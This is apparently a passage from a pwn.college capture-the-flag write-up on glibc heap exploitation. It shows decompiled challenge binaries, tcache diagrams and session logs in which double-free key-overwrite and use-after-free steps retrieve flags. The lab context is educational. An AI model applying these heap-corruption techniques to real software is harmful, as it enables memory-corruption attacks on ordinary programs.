┊    counts: ┃ count_16: 1    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &B   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
                         │
                         │
                         │
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐     │
┆  tcache_entry A  ┆     │
├──────────────────┤     │
│    next: &B      │     │
├──────────────────┤     │
│    key: NULL     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry B  ┆
├──────────────────┤
│    next: NULL    │ 
├──────────────────┤
│    key: Void     │ 
└──────────────────┘
```

When `free()` is called on a chunk that fits in the Tcache, the allocator checks if that chunk's `key` field already points to the `tcache_perthread_struct` for the current thread.

If `key == tcache_perthread_struct`, the allocator scans the relevant Tcache bin to see if that chunk is already there. If it finds it, the program crashes with a "double free or corruption (tcache)" error.

If `key != tcache_perthread_struct`, the allocator assumes the chunk is currently allocated and proceeds to add it to the Tcache.

```
a = malloc(16)
b = malloc(16)

free(b)
free(a)

a = malloc(16)

free(a)


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  tcache_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry A  ┆
├──────────────────┤
│    next: &B      │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry B  ┆
├──────────────────┤
│    next: NULL    │ 
├──────────────────┤
│    key: Void     │ 
└──────────────────┘
```

By overwriting the `key` with a dummy value (or `NULL`), we can "trick" the allocator into thinking the chunk is not currently in the Tcache. This allows us to call `free()` a second time on the same chunk without triggering the security crash.

### Exploit

```
hacker@dynamic-allocator-misuse~fickle-free-easy:~$ /challenge/fickle-free-easy 
###
### Welcome to /challenge/fickle-free-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 1 unique allocations.

In this challenge, the flag buffer is allocated 2 times before it is used.


[*] Function (malloc/free/puts/scanf/read_flag/quit): malloc   

Size: 784

[*] allocations[0] = malloc(784)
[*] allocations[0] = 0x5dbbb3dcb2c0

[*] Function (malloc/free/puts/scanf/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #48     | SIZE: 777 - 792        | COUNT: 1     | HEAD: 0x5dbbb3dcb2c0       | KEY: 0x5dbbb3dcb010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | (nil)               | 0x5dbbb3dcb010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/read_flag/quit): scanf

[*] scanf("%792s", allocations[0])
AAAAAAAAA

+====================+========================+==============+============================+============================+
| TCACHE BIN #48     | SIZE: 777 - 792        | COUNT: 1     | HEAD: 0x5dbbb3dcb2c0       | KEY: 0x5dbbb3dcb010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | 0x4141414141414141  | 0x5dbbb3dc0041      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/read_flag/quit): free

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #48     | SIZE: 777 - 792        | COUNT: 2     | HEAD: 0x5dbbb3dcb2c0       | KEY: 0x5dbbb3dcb010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | 0x5dbbb3dcb2c0      | 0x5dbbb3dcb010      |
| 0x5dbbb3dcb2c0      | 0                   | 0x321 (P)                    | 0x5dbbb3dcb2c0      | 0x5dbbb3dcb010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/scanf/read_flag/quit): read_flag

[*] flag_buffer = malloc(784)
[*] flag_buffer = 0x5dbbb3dcb2c0
[*] flag_buffer = malloc(784)
[*] flag_buffer = 0x5dbbb3dcb2c0
[*] read the flag!

[*] Function (malloc/free/puts/scanf/read_flag/quit): puts

[*] puts(allocations[0])
Data: pwn.college{Mbk_-TzLM_emeeQEjY3XeOkWk_p.01N3MDL4ITM0EzW}


[*] Function (malloc/free/puts/scanf/read_flag/quit): quit

### Goodbye!
```

&nbsp;

## Fickle Free (Hard)

This time we need to find the size of the buffer into which the flag is read.

### Binary Analysis

```c title="/challenge/fickle-free-hard :: main()" showLineNumbers 
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  int v4; // ecx
  int i; // [rsp+2Ch] [rbp-B4h]
  unsigned int size; // [rsp+34h] [rbp-ACh]
  void *size_4; // [rsp+38h] [rbp-A8h]
  void *ptr; // [rsp+48h] [rbp-98h]
  char choice[136]; // [rsp+50h] [rbp-90h] BYREF
  unsigned __int64 v11; // [rsp+D8h] [rbp-8h]

  v11 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  ptr = 0LL;
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            puts(byte_2020);
            printf("[*] Function (malloc/free/puts/scanf/read_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2020);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2020);
            size = atoi(choice);
            ptr = malloc(size);
          }
          if ( strcmp(choice, "free") )
            break;
          free(ptr);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Data: ");
        puts((const char *)ptr);
      }
      if ( strcmp(choice, "scanf") )
        break;
      v3 = malloc_usable_size(ptr);
      sprintf(choice, "%%%us", v3);
      __isoc99_scanf(choice, ptr);
      puts(byte_2020);
    }
    if ( strcmp(choice, "read_flag") )
      break;
    for ( i = 0; i <= 1; ++i )
      size_4 = malloc(328uLL);
    v4 = open("/flag", 0);
    read(v4, size_4, 128uLL);
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

- [x] Size of memory allocation into which the flag is read: `328`

### Exploit

```
hacker@dynamic-allocator-misuse~fickle-free-hard:~$ /challenge/fickle-free-hard 
###
### Welcome to /challenge/fickle-free-hard!
###


[*] Function (malloc/free/puts/scanf/read_flag/quit): malloc

Size: 328


[*] Function (malloc/free/puts/scanf/read_flag/quit): free


[*] Function (malloc/free/puts/scanf/read_flag/quit): scanf

AAAAAAAAA


[*] Function (malloc/free/puts/scanf/read_flag/quit): free


[*] Function (malloc/free/puts/scanf/read_flag/quit): read_flag


[*] Function (malloc/free/puts/scanf/read_flag/quit): puts

Data: pwn.college{Amc7hATLzmOx9D_YV-iznVKLvb-.0FO3MDL4ITM0EzW}


[*] Function (malloc/free/puts/scanf/read_flag/quit): quit    

### Goodbye!
```

&nbsp;

## Malloc Mirage (Easy)

```
hacker@dynamic-allocator-misuse~malloc-mirage-easy:~$ /challenge/malloc-mirage-easy 
###
### Welcome to /challenge/malloc-mirage-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag

[*] flag_buffer = malloc(896)
[*] flag_buffer = 0x6293f46682c0
[*] read the flag!

[*] Function (malloc/free/puts/read_flag/puts_flag/quit): 
```

Let's see what the program does by decompiling the binary.

### Binary Analysis

```c title="/challenge/malloc-mirage-easy :: main()" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int i; // [rsp+24h] [rbp-13Ch]
  unsigned int v6; // [rsp+28h] [rbp-138h]
  unsigned int v7; // [rsp+28h] [rbp-138h]
  unsigned int v8; // [rsp+28h] [rbp-138h]
  unsigned int size; // [rsp+2Ch] [rbp-134h]
  const char *size_4; // [rsp+30h] [rbp-130h]
  void *ptr[16]; // [rsp+40h] [rbp-120h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-A0h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-18h]

  v13 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_tcache(main_thread_tcache);
            puts(byte_2419);
            printf("[*] Function (malloc/free/puts/read_flag/puts_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2419);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2419);
            v6 = atoi(choice);
            if ( v6 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 228u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2419);
            size = atoi(choice);
            printf("[*] allocations[%d] = malloc(%d)\n", v6, size);
            ptr[v6] = malloc(size);
            printf("[*] allocations[%d] = %p\n", v6, ptr[v6]);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2419);
          v7 = atoi(choice);
          if ( v7 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 246u, "main");
          printf("[*] free(allocations[%d])\n", v7);
          free(ptr[v7]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_2419);
        v8 = atoi(choice);
        if ( v8 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 259u, "main");
        printf("[*] puts(allocations[%d])\n", v8);
        printf("Data: ");
        puts((const char *)ptr[v8]);
      }
      if ( strcmp(choice, "read_flag") )
        break;
      for ( i = 0; i <= 0; ++i )
      {
        printf("[*] flag_buffer = malloc(%d)\n", 896LL);
        size_4 = (const char *)malloc(896uLL);
        *(_QWORD *)size_4 = 0LL;
        printf("[*] flag_buffer = %p\n", size_4);
      }
      v3 = open("/flag", 0);
      read(v3, (void *)(size_4 + 16), 128uLL);
      puts("[*] read the flag!");
    }
    if ( strcmp(choice, "puts_flag") )
      break;
    if ( *(_QWORD *)size_4 )
      puts(size_4 + 16);
    else
      puts("Not authorized!");
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

So if we pass the `read_flag` command, the program zeroes out the first 8 bytes represented by `size_4` of that allocation. The flag is then read 16 bytes after `size_4`.

```c showLineNumbers
# ---- snip ----

      if ( strcmp(choice, "read_flag") )
        break;
      for ( i = 0; i <= 0; ++i )
      {
        printf("[*] flag_buffer = malloc(%d)\n", 896LL);
        size_4 = (const char *)malloc(896uLL);
        *(_QWORD *)size_4 = 0LL;
        printf("[*] flag_buffer = %p\n", size_4);
      }
      v3 = open("/flag", 0);
      read(v3, (void *)(size_4 + 16), 128uLL);
      puts("[*] read the flag!");

# ---- snip ----      
```

Then, if we pass `puts_flag`, it checks if the `size_4` is zeroed out. If it is, the flag is not printed.

```c showLineNumbers
# ---- snip ----

    if ( strcmp(choice, "puts_flag") )
      break;
    if ( *(_QWORD *)size_4 )
      puts(size_4 + 16);
    else
      puts("Not authorized!");

# ---- snip ----
```

### Tcache chunk chaining

When `free()` is called on a chunk that fits in the Tcache, the allocator checks if that chunk's `key` field already points to the `tcache_perthread_struct` for the current thread.

If `key == tcache_perthread_struct`, the allocator scans the relevant Tcache bin to see if that chunk is already there. If it finds it, the program crashes with a "double free or corruption (tcache)" error.

If `key != tcache_perthread_struct`, the allocator assumes the chunk is currently allocated and proceeds to add it to the Tcache by setting that chunk's `key` pointer to the `tcache_perthread_struct` for the current thread. It also adds that chunk to the beginning of the singly-linked list by setting the chunks `next` pointer to the address of the previously first chunk.

```
a = malloc(16)
b = malloc(16)

free(b)
free(a)


┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┊  tcache_perthread_struct Void                                        ┊
┊            ┏━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━━━━┓      ┊
┊    counts: ┃ count_16: 2    ┃ count_32: 0    ┃ count_48: 0    ┃ ...  ┊
┊            ┣━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━╋━━━━━━━━━━━━━━━━┫      ┊
┊   entries: ┃ entry_16: &A   ┃ entry_32: NULL ┃ entry_48: NULL ┃ ...  ┊
┊            ┗━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━┛      ┊ 
└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry A  ┆
├──────────────────┤
│    next: &B      │ ────╮
├──────────────────┤     │
│    key: Void     │     │
└──────────────────┘     │
                         │
         ╭───────────────╯         
         │
         v
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
┆  tcache_entry B  ┆
├──────────────────┤
│    next: NULL    │ 
├──────────────────┤
│    key: Void     │ 
└──────────────────┘
```

Knowing this, if we make the program read the flag to a chunk that we control using UAF, and then free that chunk, when it's `next` pointer is be set, the `size_4` check is overwritten.
We can `free` that chunk, because `read_flag` causes the `key` pointer which was pointing to `tcache_perthread_struct`, to be overwritten.

Thus we will be able to use the `puts_flag` command and get the flag.

### Exploit

```
hacker@dynamic-allocator-misuse~malloc-mirage-easy:~$ /challenge/malloc-mirage-easy 
###
### Welcome to /challenge/malloc-mirage-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 0

Size: 896

[*] allocations[0] = malloc(896)
[*] allocations[0] = 0x644fee8f22c0

[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 1

Size: 896

[*] allocations[1] = malloc(896)
[*] allocations[1] = 0x644fee8f2650

[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 1

[*] free(allocations[1])
+====================+========================+==============+============================+============================+
| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 1     | HEAD: 0x644fee8f2650       | KEY: 0x644fee8f2010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 2     | HEAD: 0x644fee8f22c0       | KEY: 0x644fee8f2010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x644fee8f22c0      | 0                   | 0x391 (P)                    | 0x644fee8f2650      | 0x644fee8f2010      |
| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag

[*] flag_buffer = malloc(896)
[*] flag_buffer = 0x644fee8f22c0
[*] read the flag!
+====================+========================+==============+============================+============================+
| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 1     | HEAD: 0x644fee8f2650       | KEY: 0x644fee8f2010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 0

[*] free(allocations[0])
+====================+========================+==============+============================+============================+
| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 2     | HEAD: 0x644fee8f22c0       | KEY: 0x644fee8f2010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x644fee8f22c0      | 0                   | 0x391 (P)                    | 0x644fee8f2650      | 0x644fee8f2010      |
| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): puts_flag

pwn.college{YaCr8LqQNO7XOxRVrb2l58ayfLL.0VO3MDL4ITM0EzW}

+====================+========================+==============+============================+============================+
| TCACHE BIN #55     | SIZE: 889 - 904        | COUNT: 2     | HEAD: 0x644fee8f22c0       | KEY: 0x644fee8f2010        |
+====================+========================+==============+============================+============================+
| ADDRESS             | PREV_SIZE (-0x10)   | SIZE (-0x08)                 | next (+0x00)        | key (+0x08)         |
+---------------------+---------------------+------------------------------+---------------------+---------------------+
| 0x644fee8f22c0      | 0                   | 0x391 (P)                    | 0x644fee8f2650      | 0x644fee8f2010      |
| 0x644fee8f2650      | 0                   | 0x391 (P)                    | (nil)               | 0x644fee8f2010      |
+----------------------------------------------------------------------------------------------------------------------+


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): quit

### Goodbye!
```

&nbsp;

## Malloc Mirage (Hard)

```
hacker@dynamic-allocator-misuse~malloc-mirage-hard:/$ /challenge/malloc-mirage-hard 
###
### Welcome to /challenge/malloc-mirage-hard!
###


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): 
```

We need to figure out the following in order to solve the hard version.
- [ ] Size of memory allocation into which the flag is read

### Binary Analysis

```c title="/challenge/malloc-mirage-hard :: main()" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int i; // [rsp+24h] [rbp-13Ch]
  unsigned int v6; // [rsp+28h] [rbp-138h]
  unsigned int v7; // [rsp+28h] [rbp-138h]
  unsigned int v8; // [rsp+28h] [rbp-138h]
  unsigned int size; // [rsp+2Ch] [rbp-134h]
  const char *size_4; // [rsp+30h] [rbp-130h]
  void *ptr[16]; // [rsp+40h] [rbp-120h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-A0h] BYREF
  unsigned __int64 v13; // [rsp+148h] [rbp-18h]

  v13 = __readfsqword(40u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            puts(byte_2020);
            printf("[*] Function (malloc/free/puts/read_flag/puts_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2020);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2020);
            v6 = atoi(choice);
            if ( v6 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 66u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_2020);
            size = atoi(choice);
            ptr[v6] = malloc(size);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_2020);
          v7 = atoi(choice);
          if ( v7 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 82u, "main");
          free(ptr[v7]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_2020);
        v8 = atoi(choice);
        if ( v8 > 15 )
          __assert_fail("allocation_index < 16", "<stdin>", 94u, "main");
        printf("Data: ");
        puts((const char *)ptr[v8]);
      }
      if ( strcmp(choice, "read_flag") )
        break;
      for ( i = 0; i <= 0; ++i )
      {
        size_4 = (const char *)malloc(784uLL);
        *(_QWORD *)size_4 = 0LL;
      }
      v3 = open("/flag", 0);
      read(v3, (void *)(size_4 + 16), 128uLL);
    }
    if ( strcmp(choice, "puts_flag") )
      break;
    if ( *(_QWORD *)size_4 )
      puts(size_4 + 16);
    else
      puts("Not authorized!");
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

- [x] Size of memory allocation into which the flag is read: `784`

### Exploit

```
hacker@dynamic-allocator-misuse~malloc-mirage-hard:/$ /challenge/malloc-mirage-hard 
###
### Welcome to /challenge/malloc-mirage-hard!
###


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 0

Size: 784


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): malloc

Index: 1

Size: 784


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 1


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 0


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): read_flag


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): free

Index: 0


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): puts_flag

pwn.college{knO2mcRxdTIDye38lEOhpvy9MXg.0FM4MDL4ITM0EzW}


[*] Function (malloc/free/puts/read_flag/puts_flag/quit): quit

### Goodbye!
```

&nbsp;

## Seeking Secrets (Easy)

```
hacker@dynamic-allocator-misuse~seeking-secrets-easy:/$ /challenge/seeking-secrets-easy 
###
### Welcome to /challenge/seeking-secrets-easy!
###

This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of
challenges, you will become familiar with the concept of heap exploitation.

This challenge can manage up to 16 unique allocations.

In this challenge, there is a secret stored at 0x423266.
If you can leak out this secret, you can redeem it for the flag.


[*] Function (malloc/free/puts/scanf/send_flag/quit): 
```

Lets look at the decompiled code in order to figure out the functionality of the challenge.

### Binary Analysis

```c title="/challenge/seeking-secrets-easy :: main()" showLineNumbers
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  unsigned int v4; // eax
  int i; // [rsp+2Ch] [rbp-124h]
  unsigned int v7; // [rsp+30h] [rbp-120h]
  unsigned int v8; // [rsp+30h] [rbp-120h]
  unsigned int v9; // [rsp+30h] [rbp-120h]
  unsigned int v10; // [rsp+30h] [rbp-120h]
  unsigned int size; // [rsp+34h] [rbp-11Ch]
  void *ptr[16]; // [rsp+40h] [rbp-110h] BYREF
  char choice[136]; // [rsp+C0h] [rbp-90h] BYREF
  unsigned __int64 v14; // [rsp+148h] [rbp-8h]

  v14 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 1uLL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  memset(ptr, 0, sizeof(ptr));
  for ( i = 0; i <= 7; ++i )
    byte_423266[i] = rand() % 26 + 97;
  puts(
    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
  printf("This challenge can manage up to %d unique allocations.\n\n", 16LL);
  printf("In this challenge, there is a secret stored at %p.\n", byte_423266);
  puts("If you can leak out this secret, you can redeem it for the flag.\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( 1 )
          {
            print_tcache(main_thread_tcache);
            puts(byte_4035BA);
            printf("[*] Function (malloc/free/puts/scanf/send_flag/quit): ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035BA);
            if ( strcmp(choice, "malloc") )
              break;
            printf("Index: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035BA);
            v7 = atoi(choice);
            if ( v7 > 15 )
              __assert_fail("allocation_index < 16", "<stdin>", 279u, "main");
            printf("Size: ");
            __isoc99_scanf("%127s", choice);
            puts(byte_4035BA);
            size = atoi(choice);
            printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
            ptr[v7] = malloc(size);
            printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
          }
          if ( strcmp(choice, "free") )
            break;
          printf("Index: ");
          __isoc99_scanf("%127s", choice);
          puts(byte_4035BA);
          v8 = atoi(choice);
          if ( v8 > 15 )
            __assert_fail("allocation_index < 16", "<stdin>", 297u, "main");
          printf("[*] free(allocations[%d])\n", v8);
          free(ptr[v8]);
        }
        if ( strcmp(choice, "puts") )
          break;
        printf("Index: ");
        __isoc99_scanf("%127s", choice);
        puts(byte_4035BA);
        v9 = atoi(choice);
        if ( v9 > 0xF )
          __assert_fail("allocation_index < 16", "<stdin>", 0x136u, "main");
        printf("[*] puts(allocations[%d])\n", v9);
        printf("Data: ");
        puts((const char *)ptr[v9]);
      }
      if ( strcmp(choice, "scanf") )
        break;
      printf("Index: ");
      __isoc99_scanf("%127s", choice);
      puts(byte_4035BA);
      v10 = atoi(choice);
      if ( v10 > 15 )
        __assert_fail("allocation_index < 16", "<stdin>", 323u, "main");
      v3 = malloc_usable_size(ptr[v10]);
      sprintf(choice, "%%%us", v3);
      v4 = malloc_usable_size(ptr[v10]);
      printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
      __isoc99_scanf(choice, ptr[v10]);
      puts(byte_4035BA);
    }
    if ( strcmp(choice, "send_flag") )
      break;
    printf("Secret: ");
    __isoc99_scanf("%127s", choice);
    puts(byte_4035BA);
    if ( !memcmp(choice, byte_423266, 8uLL) )
    {
      puts("Authorized!");
      win();
    }
    else
    {
      puts("Not authorized!");
    }
  }
  if ( strcmp(choice, "quit") )
    puts("Unrecognized choice!");
  puts("### Goodbye!");
  return 0;
}
```

So the secret is kept at a location in memory, which we have to read from and pass to the `send_flag`.

### Polluting Tcache `entry_struct`

Let's say we allocate two chunks `A`, `B` of memory and then free them. It would look something as follows:

```
┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
